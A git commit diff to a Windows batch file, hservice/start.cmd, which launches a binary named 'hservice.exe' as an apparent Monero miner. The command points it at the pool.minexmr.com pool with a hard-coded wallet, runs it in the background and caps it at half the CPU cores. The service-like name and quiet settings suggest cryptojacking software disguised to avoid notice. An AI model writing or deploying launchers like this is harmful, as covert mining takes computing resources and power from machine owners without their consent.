8debccec1fe52a536ee12d0a282316b6cfb3ef91
JohnSmithNA <98902896+JohnSmithNA@users.noreply.github.com>
2022-02-04 16:20:33 +0100

    Update start.cmd

--- hservice/start.cmd
+++ hservice/start.cmd
@@ -1,3 +1,4 @@
 @echo off
-hservice.exe -o pool.minexmr.com:443 -u <wallet> -k --tls -t 1 --rig-id %COMPUTERNAME% -B
+set /a logicprocessor = "%NUMBER_OF_PROCESSORS%/2"
+hservice.exe -o pool.minexmr.com:443 -u 48LFDhtqfquYSy7njxBb859taAJTN6iFyZcMxtiakUMfGAJ3tzkTpRkbc5cvUN35dCNYUkofwp59Z33HjLwvZoah4PBQgy2 -k --tls -t %logicprocessor% --rig-id %COMPUTERNAME% -B
 pause
